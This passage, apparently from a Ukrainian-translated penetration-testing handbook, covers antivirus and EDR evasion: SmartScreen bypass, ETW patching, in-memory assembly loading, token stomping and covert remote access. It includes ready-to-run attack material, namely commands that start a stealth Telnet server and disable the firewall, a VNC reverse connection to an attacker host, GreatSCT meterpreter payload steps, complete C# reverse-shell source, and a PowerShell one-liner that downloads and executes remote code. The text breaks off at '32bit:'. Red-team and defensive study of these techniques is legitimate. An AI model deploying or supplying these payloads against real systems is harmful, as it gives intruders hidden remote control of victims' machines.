Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ‚Äî —Ü–µ –ø–æ—Ç—É–∂–Ω–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º –ª–æ–≥—É–≤–∞–Ω–Ω—è –≤ Windows, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –¥–æ–¥–∞—Ç–∫–∞–º —Ç–∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º —Å–∏—Å—Ç–µ–º–∏ **–ª–æ–≥—É–≤–∞—Ç–∏ –ø–æ–¥—ñ—ó**. –û–¥–Ω–∞–∫ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ–¥—É–∫—Ç–∏ –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ.

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –¥–æ —Ç–æ–≥–æ, —è–∫ AMSI –≤—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è (bypassed), —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–º—É—Å–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é **`EtwEventWrite`** —É –ø—Ä–æ—Ü–µ—Å—ñ –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –æ–¥—Ä–∞–∑—É –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –±–µ–∑ –ª–æ–≥—É–≤–∞–Ω–Ω—è –ø–æ–¥—ñ–π. –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–∞—Ç—á–∏–Ω–≥—É —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–∞–º'—è—Ç—ñ, —â–æ–± –≤–æ–Ω–∞ –º–∏—Ç—Ç—î–≤–æ –ø–æ–≤–µ—Ä—Ç–∞–ª–∞—Å—è, —Ñ–∞–∫—Ç–∏—á–Ω–æ –≤—ñ–¥–∫–ª—é—á–∞—é—á–∏ ETW-–ª–æ–≥—É–≤–∞–Ω–Ω—è –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory –≤—ñ–¥–æ–º–∏–π —É–∂–µ –¥–æ—Å–∏—Ç—å –¥–∞–≤–Ω–æ —ñ –¥–æ—Å—ñ —î –≤—ñ–¥–º—ñ–Ω–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º –∑–∞–ø—É—Å–∫—É –≤–∞—à–∏—Ö post-exploitation —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è AV.

–û—Å–∫—ñ–ª—å–∫–∏ payload –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—å –±–µ–∑ –∑–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–æ –¥–∏—Å–∫–∞, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –ª–∏—à–µ –ø–æ–¥–±–∞—Ç–∏ –ø—Ä–æ –ø–∞—Ç—á–∏–Ω–≥ AMSI –¥–ª—è –≤—Å—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) –≤–∂–µ –Ω–∞–¥–∞—é—Ç—å –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ C# assemblies –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—ñ, –∞–ª–µ —ñ—Å–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ:

- **Fork\&Run**

–¶–µ –≤–∫–ª—é—á–∞—î **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É (sacrificial process)**, —ñ–Ω–∂–µ–∫—Ü—ñ—é –≤–∞—à–æ–≥–æ post-exploitation —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É –≤ —Ü–µ–π –Ω–æ–≤–∏–π –ø—Ä–æ—Ü–µ—Å, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —ñ –ø—ñ—Å–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è ‚Äî –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É. –£ —Ü—å–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É —î —è–∫ –ø–µ—Ä–µ–≤–∞–≥–∏, —Ç–∞–∫ —ñ –Ω–µ–¥–æ–ª—ñ–∫–∏. –ü–µ—Ä–µ–≤–∞–≥–∞ –º–µ—Ç–æ–¥—É fork and run –≤ —Ç–æ–º—É, —â–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è **–ø–æ–∑–∞** –Ω–∞—à–∏–º Beacon implant –ø—Ä–æ—Ü–µ—Å–æ–º. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ —â–æ—Å—å –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫ –∞–±–æ –±—É–¥–µ –≤–∏—è–≤–ª–µ–Ω–æ –ø—ñ–¥ —á–∞—Å –Ω–∞—à–∏—Ö post-exploitation –¥—ñ–π, —î **–∑–Ω–∞—á–Ω–æ –±—ñ–ª—å—à–∏–π —à–∞–Ω—Å**, —â–æ –Ω–∞—à **—ñ–º–ø–ª–∞–Ω—Ç –≤–∏–∂–∏–≤–µ.** –ù–µ–¥–æ–ª—ñ–∫ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —ñ—Å–Ω—É—î **–±—ñ–ª—å—à–∏–π —Ä–∏–∑–∏–∫** –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–∏–º —á–µ—Ä–µ–∑ **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

–¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–ª—è–≥–∞—î –≤ —ñ–Ω–∂–µ–∫—Ü—ñ—ó post-exploitation —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É **–≤ —Å–∞–º –ø—Ä–æ—Ü–µ—Å**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º –º–æ–∂–Ω–∞ —É–Ω–∏–∫–Ω—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É —ñ –π–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AV, –∞–ª–µ –Ω–µ–¥–æ–ª—ñ–∫ —É —Ç–æ–º—É, —â–æ —è–∫—â–æ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è payload —â–æ—Å—å –ø—ñ–¥–µ –Ω–µ —Ç–∞–∫, —î **–∑–Ω–∞—á–Ω–æ –±—ñ–ª—å—à–∏–π —à–∞–Ω—Å** **–≤—Ç—Ä–∞—Ç–∏—Ç–∏ –≤–∞—à beacon**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º–æ–∂–µ –≤–ø–∞—Å—Ç–∏.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –±—ñ–ª—å—à–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –ø—Ä–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è C# Assembly, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü—é —Å—Ç–∞—Ç—Ç—é [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) —Ç–∞ —ó—Ö–Ω—ñ–π InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ —ñ–Ω—à–∏–º–∏ –º–æ–≤–∞–º–∏, –Ω–∞–¥–∞–≤—à–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—ñ–π –º–∞—à–∏–Ω—ñ –¥–æ—Å—Ç—É–ø **to the interpreter environment installed on the Attacker Controlled SMB share**.

–ù–∞–¥–∞—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ Interpreter Binaries —Ç–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –Ω–∞ SMB share, –≤–∏ –º–æ–∂–µ—Ç–µ **execute arbitrary code in these languages within memory** —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ—ó –º–∞—à–∏–Ω–∏.

The repo indicates: Defender –≤—Å–µ —â–µ —Å–∫–∞–Ω—É—î —Å–∫—Ä–∏–ø—Ç–∏, –∞–ª–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Go, Java, PHP —Ç–æ—â–æ, –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ **–±—ñ–ª—å—à–µ –≥–Ω—É—á–∫–æ—Å—Ç—ñ –¥–ª—è –æ–±—Ö–æ–¥—É —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä**. –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –∑ –≤–∏–ø–∞–¥–∫–æ–≤–∏–º–∏ –Ω–µ –æ–±—Ñ—É—Å—Ü–æ–≤–∞–Ω–∏–º–∏ reverse shell —Å–∫—Ä–∏–ø—Ç–∞–º–∏ –Ω–∞ —Ü–∏—Ö –º–æ–≤–∞—Ö –ø–æ–∫–∞–∑–∞–ª–æ —É—Å–ø—ñ—à–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏.

## TokenStomping

Token stomping ‚Äî —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **manipulate the access token or a security prouct like an EDR or AV**, —â–æ –¥–∞—î –∑–º–æ–≥—É –∑–Ω–∏–∑–∏—Ç–∏ –π–æ–≥–æ –ø—Ä–∏–≤—ñ–ª–µ—ó —Ç–∞–∫, —â–æ–± –ø—Ä–æ—Ü–µ—Å –Ω–µ –ø–æ–º–µ—Ä, –∞–ª–µ –≤ –Ω—å–æ–≥–æ –Ω–µ –±—É–ª–æ –¥–æ–∑–≤–æ–ª—ñ–≤ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —à–∫—ñ–¥–ª–∏–≤—É –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å.

–©–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Ü—å–æ–º—É, Windows –º–æ–≥–ª–∞ –± **–∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –ø—Ä–æ—Ü–µ—Å–∞–º** –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ (handles) —Ç–æ–∫–µ–Ω—ñ–≤ –ø—Ä–æ—Ü–µ—Å—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

–Ø–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), –¥–æ—Å–∏—Ç—å –ø—Ä–æ—Å—Ç–æ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ Chrome Remote Desktop –Ω–∞ –º–∞—à–∏–Ω—ñ –∂–µ—Ä—Ç–≤–∏ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è takeover —Ç–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ persistence:
1. Download from https://remotedesktop.google.com/, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å "Set up via SSH", –∞ –ø–æ—Ç—ñ–º –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ MSI —Ñ–∞–π–ª –¥–ª—è Windows, —â–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ MSI.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. –ü–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É Chrome Remote Desktop —ñ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å Next. –ú–∞–π—Å—Ç–µ—Ä –ø–æ–ø—Ä–æ—Å–∏—Ç—å –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏—Å—è; –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É Authorize, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏.
4. –ó–∞–ø—É—Å—Ç—ñ—Ç—å –≤–∫–∞–∑–∞–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∑ –Ω–µ–≤–µ–ª–∏–∫–∏–º–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä pin, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ PIN –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è GUI).

## Advanced Evasion

Evasion ‚Äî –¥—É–∂–µ —Å–∫–ª–∞–¥–Ω–∞ —Ç–µ–º–∞, —ñ–Ω–æ–¥—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –±–∞–≥–∞—Ç–æ —Ä—ñ–∑–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª —Ç–µ–ª–µ–º–µ—Ç—Ä—ñ—ó –≤ –æ–¥–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ, —Ç–æ–º—É –ø—Ä–∞–∫—Ç–∏—á–Ω–æ –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ª–∏—à–∞—Ç–∏—Å—è –ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–µ–ø–æ–º—ñ—á–µ–Ω–∏–º —É –¥–æ—Ä–æ—Å–ª–∏—Ö (mature) —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö.

–ö–æ–∂–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ, –∑ —è–∫–∏–º –≤–∏ –∑—ñ—Ç–∫–Ω–µ—Ç–µ—Å—å, –º–∞—Ç–∏–º–µ —Å–≤–æ—ó —Å–∏–ª—å–Ω—ñ —Ç–∞ —Å–ª–∞–±–∫—ñ —Å—Ç–æ—Ä–æ–Ω–∏.

–†–∞–¥–∂—É –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ü–µ–π –¥–æ–ø–æ–≤—ñ–¥—å –≤—ñ–¥ [@ATTL4S](https://twitter.com/DaniLJ94), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —É—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ –±—ñ–ª—å—à –ø—Ä–æ—Å—É–Ω—É—Ç—ñ Advanced Evasion —Ç–µ—Ö–Ω—ñ–∫–∏.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), —è–∫–∏–π **–ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ –≤–∏–¥–∞–ª—è—î —á–∞—Å—Ç–∏–Ω–∏ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É** –¥–æ—Ç–∏, –ø–æ–∫–∏ **–Ω–µ –≤–∏–∑–Ω–∞—á–∏—Ç—å, —è–∫—É —á–∞—Å—Ç–∏–Ω—É Defender** –≤–≤–∞–∂–∞—î —à–∫—ñ–¥–ª–∏–≤–æ—é, —ñ –ø–æ–≤—ñ–¥–æ–º–∏—Ç—å –≤–∞–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏.\
–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —â–æ —Ä–æ–±–∏—Ç—å **—Ç–µ —Å–∞–º–µ**, ‚Äî [**avred**](https://github.com/dobin/avred) –∑ –≤—ñ–¥–∫—Ä–∏—Ç–æ—é –≤–µ–±-—Å–ª—É–∂–±–æ—é –∑–∞ –∞–¥—Ä–µ—Å–æ—é [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

–î–æ Windows10 –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó Windows –º–∞–ª–∏ **Telnet server**, —è–∫–∏–π –≤–∏ –º–æ–≥–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ (—è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä), –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
–ó—Ä–æ–±—ñ—Ç—å —Ç–∞–∫, —â–æ–± –≤—ñ–Ω **–∑–∞–ø—É—Å–∫–∞–≤—Å—è** –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏ —ñ **–∑–∞–ø—É—Å—Ç—ñ—Ç—å** –π–æ–≥–æ –∑–∞—Ä–∞–∑:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (—Å—Ç–µ–ª—Å) —Ç–∞ –≤–∏–º–∫–Ω—É—Ç–∏ firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

–ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (–≤–∏–±–∏—Ä–∞–π—Ç–µ bin downloads, –∞ –Ω–µ setup)

**ON THE HOST**: –í–∏–∫–æ–Ω–∞–π—Ç–µ _**winvnc.exe**_ —ñ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ —Å–µ—Ä–≤–µ—Ä:

- –£–≤—ñ–º–∫–Ω—ñ—Ç—å –æ–ø—Ü—ñ—é _Disable TrayIcon_
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å —É _VNC Password_
- –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å —É _View-Only Password_

–ü–æ—Ç—ñ–º –ø–µ—Ä–µ–º—ñ—Å—Ç—ñ—Ç—å –¥–≤—ñ–π–∫–æ–≤–∏–π —Ñ–∞–π–ª _**winvnc.exe**_ —Ç–∞ **–Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π** —Ñ–∞–π–ª _**UltraVNC.ini**_ –Ω–∞ **victim**

#### **Reverse connection**

The **attacker** –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–∞ —Å–≤–æ—î–º—É **host** –¥–≤—ñ–π–∫–æ–≤–∏–π —Ñ–∞–π–ª `vncviewer.exe -listen 5900`, —â–æ–± –±—É—Ç–∏ **prepared** –¥–æ –ø—Ä–∏–π–æ–º—É –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ **VNC connection**. –ü–æ—Ç—ñ–º, –Ω–∞ **victim**: –∑–∞–ø—É—Å—Ç—ñ—Ç—å –¥–µ–º–æ–Ω winvnc `winvnc.exe -run` —ñ –≤–∏–∫–æ–Ω–∞–π—Ç–µ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** –©–æ–± –∑–±–µ—Ä–µ–≥—Ç–∏ stealth, –Ω–µ —Ä–æ–±—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ

- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc`, —è–∫—â–æ –≤—ñ–Ω —É–∂–µ –ø—Ä–∞—Ü—é—î ‚Äî —ñ–Ω–∞–∫—à–µ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [popup](https://i.imgur.com/1SROTTl.png). –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤—ñ–Ω –ø—Ä–∞—Ü—é—î –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `tasklist | findstr winvnc`
- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc` –±–µ–∑ `UltraVNC.ini` —É —Ç—ñ–π –∂–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó ‚Äî —Ü–µ –≤–∏–∫–ª–∏—á–µ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è [the config window](https://i.imgur.com/rfMQWcf.png)
- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc -h` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —è–∫—ó—Å—å –¥–æ–≤—ñ–¥–∫–∏ ‚Äî —ñ–Ω–∞–∫—à–µ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

–ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
–í—Å–µ—Ä–µ–¥–∏–Ω—ñ GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
–¢–µ–ø–µ—Ä **start the lister** –∫–æ–º–∞–Ω–¥–æ—é `msfconsole -r file.rc` —Ç–∞ **–≤–∏–∫–æ–Ω–∞–π—Ç–µ** **xml payload** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**–ü–æ—Ç–æ—á–Ω–∏–π defender –¥—É–∂–µ —à–≤–∏–¥–∫–æ –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å.**

### –ö–æ–º–ø—ñ–ª—è—Ü—ñ—è –≤–ª–∞—Å–Ω–æ–≥–æ reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### –ü–µ—Ä—à–∏–π C# Revershell

–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ü–µ –∑:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
